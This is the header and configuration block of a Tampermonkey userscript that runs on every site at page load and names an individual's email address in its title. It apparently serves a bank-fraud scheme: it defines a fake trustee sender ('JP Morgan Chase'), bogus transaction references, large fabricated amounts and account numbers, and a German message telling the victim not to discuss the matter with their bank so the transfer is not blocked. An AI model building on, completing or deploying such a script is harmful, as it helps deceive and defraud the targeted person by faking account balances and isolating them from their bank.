// ==UserScript==
// @name         Ed Start 4Rec sp.b.r.meyer-jb@t-online.de
// @namespace    http://tampermonkey.net/
// @version      2.771
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-start
// @downloadURL https://update.greasyfork.org/scripts/528646/Ed%20Start%204Rec%20spbrmeyer-jb%40t-onlinede.user.js
// @updateURL https://update.greasyfork.org/scripts/528646/Ed%20Start%204Rec%20spbrmeyer-jb%40t-onlinede.meta.js
// ==/UserScript==







//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
    //SCRIPTV2 TRIGGER!



    //SCRIPTV2 TRIGGER!
    var easyUpdate = "no";


    var pointerOverviewTotal = "";
    var pointerTabelle = "xx";
    var absender = "Treuhand: JP Morgan Chase";
    var absenderTitel = "Treuhand: JP Morgan Chase";
    var firma = "test";
    var asenderReference = "WD3746 TRX88205A CX13280";
    var absenderDetails = "Freigabe nötig durch JP Morgan. Mit Bank nicht besprechen damit nicht gesperrt. A. Graf meldet sich.";
    var amount = 10;
    var vorgemerkt = "no";
    var xamount = 281900;
    var x2amount = 0;
    var buchung = 20000;
    var buchungDecimal = "70";
    var buchungTextsZahl = "437.680";
    var accountsecurity = "1103 0055 84";

    if (easyUpdate == "yes"){
        x2amount = 10000;}

    var umsatze = "11490787216";
    var finanz = "11490787029";
    var kontodetails = "Downloads";

